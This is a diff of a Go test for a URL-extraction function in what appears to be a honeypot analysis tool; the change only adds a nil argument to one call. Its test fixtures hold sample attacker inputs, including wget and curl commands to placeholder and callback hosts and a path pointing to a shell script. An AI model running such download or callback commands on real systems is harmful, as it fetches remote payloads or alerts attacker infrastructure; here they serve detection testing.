@@ -319,7 +319,7 @@ func TestURLFindings(t *testing.T) {
 	addEvent(h, "command", "ssh", "203.0.113.52", "", "Censys, Inc.", map[string]any{"input": "wget http://198.51.100.23/c"}) // Forschungsscanner
 	addEvent(h, "request", "http", "203.0.113.53", "", "", map[string]any{"path": "/x?u=http://198.51.100.24/w.sh"})          // Web-Pfad
 	addEvent(h, "command", "ssh", "203.0.113.54", "", "", map[string]any{"input": "curl http://abc.oast.fun/x"})              // Rückruf
-	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour))
+	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour), nil)
 	if err != nil {
 		t.Fatal(err)
 	}
